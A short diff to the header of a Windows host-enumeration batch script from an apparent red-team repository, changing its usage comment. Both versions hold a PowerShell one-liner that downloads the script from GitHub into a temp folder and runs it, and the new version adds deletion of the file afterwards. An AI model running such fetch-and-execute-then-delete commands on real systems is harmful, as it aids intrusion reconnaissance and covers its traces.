@@ -1,4 +1,4 @@
-rem Usage: powershell.exe "wget https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Host_Recon_Complete.bat -o C:\Windows\Temp\Host_Recon_Complete.bat;C:\Windows\Temp\Host_Recon_Complete.bat"
+rem Usage: powershell.exe "wget https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Host_Recon_Complete.bat -o C:\Windows\Temp\Host_Recon_Complete.bat;C:\Windows\Temp\Host_Recon_Complete.bat;del C:\Windows\Temp\Host_Recon_Complete.bat"
 rem Description: Windows enumeration scrip
 
 rem --------------------------------- Host and user details ------------------------------------------
